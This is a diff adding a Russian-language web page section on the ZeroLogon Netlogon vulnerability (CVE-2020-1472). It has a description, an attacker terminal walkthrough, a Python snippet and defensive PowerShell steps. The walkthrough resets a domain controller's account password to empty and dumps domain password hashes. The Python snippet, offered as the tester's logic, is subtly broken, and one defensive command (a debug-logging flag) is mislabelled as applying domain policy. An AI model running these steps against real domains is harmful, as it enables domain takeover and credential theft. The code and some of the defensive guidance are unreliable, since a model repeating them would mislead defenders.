@@ -1,0 +1,227 @@
+<!-- ZeroLogon Details -->
+<section class="py-20 bg-gray-900/50" id="zerologon">
+    <div class="container mx-auto px-4">
+        <div class="exploit-detail">
+            <div class="exploit-detail__header">
+                <div class="exploit-detail__meta">
+                    <span class="exploit-detail__year">2020</span>
+                    <span class="exploit-detail__severity exploit-detail__severity--critical">Критический</span>
+                </div>
+                <h2 class="exploit-detail__title">ZeroLogon (CVE-2020-1472)</h2>
+                <p class="exploit-detail__subtitle">Уязвимость в протоколе аутентификации Netlogon</p>
+            </div>
+
+            <div class="exploit-detail__content">
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Описание</h3>
+                    <p>ZeroLogon — это критическая уязвимость в криптографическом протоколе MS-NRPC (Netlogon Remote Protocol), используемом Windows для аутентификации пользователей и компьютеров в домене. Уязвимость получила максимальную оценку 10.0 из 10 по шкале CVSS.</p>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Технические детали</h3>
+                    <p>Уязвимость возникает из-за некорректной реализации протокола шифрования AES-CFB8, что позволяет злоумышленнику подделать аутентификацию и получить доступ к контроллеру домена. Атака требует отправки специально сформированных пакетов к контроллеру домена.</p>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">ZeroLogon - Эксплуатация уязвимости</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Клонируем репозиторий с эксплойтом</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">git clone https://github.com/SecuraBV/CVE-2020-1472</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">cd CVE-2020-1472</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Запускаем проверку уязвимости</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">python3 zerologon_tester.py DC01 192.168.1.10</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                [*] Target is vulnerable to CVE-2020-1472 (ZeroLogon)!
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Эксплуатируем уязвимость (сбрасываем пароль администратора)</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">python3 cve-2020-1472-exploit.py DC01 192.168.1.10</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                [*] Success! DC01 account password has been reset to empty
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Получаем хэши паролей домена</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">secretsdump.py -just-dc -no-pass DC01\$@192.168.1.10</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal my-8">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">zerologon_tester.py - Основная логика проверки уязвимости</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-code">
+<pre><code>def perform_attack(dc_handle, dc_ip, dc_name):
+    # Создаем подключение к контроллеру домена
+    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
+    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+    rpc_con.connect()
+    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+
+    # Создаем запрос NetrServerReqChallenge с нулевыми байтами
+    plaintext = b'\x00' * 8
+    ciphertext = b'\x00' * 8
+    
+    # Отправляем 2000 запросов с нулевыми байтами (атака на протокол)
+    for attempt in range(0, 2000):
+        try:
+            # Отправляем запрос на аутентификацию
+            nrpc.hNetrServerReqChallenge(
+                rpc_con, dc_handle + '\\x00',
+                '\\x00' * 8, plaintext
+            )
+            
+            # Если ответ получен, проверяем его
+            server_auth = nrpc.hNetrServerAuthenticate3(
+                rpc_con, dc_handle + '\\x00',
+                'Windows XP\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+                dc_name + '\\x00', ciphertext, 0x212fffff
+            )
+            
+            # Если аутентификация успешна, уязвимость подтверждена
+            return True
+            
+        except nrpc.DCERPCSessionError as ex:
+            # Обрабатываем ошибки протокола
+            if ex.get_error_code() == 0xc0000022:
+                continue
+            else:
+                return False
+    
+    return False</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Пострадавшие</h3>
+                    <ul class="exploit-detail__list">
+                        <li>Windows Server 2008 R2 SP1</li>
+                        <li>Windows Server 2012, 2012 R2</li>
+                        <li>Windows Server 2016</li>
+                        <li>Windows Server 2019</li>
+                        <li>Windows Server, версия 1903, 1909, 2004</li>
+                    </ul>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Известные инциденты</h3>
+                    <div class="exploit-detail__incidents">
+                        <div class="incident">
+                            <div class="incident__date">Сентябрь 2020</div>
+                            <div class="incident__description">Обнаружены активные атаки на корпоративные сети с использованием ZeroLogon</div>
+                        </div>
+                        <div class="incident">
+                            <div class="incident__date">Октябрь 2020</div>
+                            <div class="incident__description">Киберпреступные группировки начали массово использовать уязвимость для атак на компании по всему миру</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Меры защиты</h3>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">PowerShell - Защитные меры</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 1. Проверка установленных обновлений</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Get-HotFix | Where-Object {$_.HotFixID -like "KB4557423*" -or $_.HotFixID -like "KB4571694*"}</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 2. Включение принудительной защиты Netlogon</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" `
+  -Name "FullSecureChannelProtection" -Value 1 -PropertyType DWord -Force</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 3. Применение политики домена</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">nltest /DBFlag:0x2000ffff</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold mb-3">Дополнительные рекомендации:</h4>
+                        <ul class="list-disc pl-5 space-y-2 text-gray-300">
+                            <li>Установите последние накопительные обновления для Windows Server</li>
+                            <li>Ограничьте доступ к портам 135/TCP, 139/TCP, 445/TCP и 389/TCP на контроллерах домена</li>
+                            <li>Настройте аудит успешных и неудачных попыток входа в систему</li>
+                            <li>Регулярно проверяйте журналы безопасности на предмет подозрительной активности</li>
+                            <li>Используйте LAPS (Local Administrator Password Solution) для управления паролями локальных администраторов</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Дополнительные ресурсы</h3>
+                    <ul class="exploit-detail__links">
+                        <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472" target="_blank" rel="noopener noreferrer">Microsoft Security Response Center</a></li>
+                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472" target="_blank" rel="noopener noreferrer">NVD - CVE-2020-1472</a></li>
+                        <li><a href="https://www.cisa.gov/uscert/ncas/current-activity/2020/09/28/exploiting-zerologon-cve-2020-1472" target="_blank" rel="noopener noreferrer">CISA Alert on ZeroLogon</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
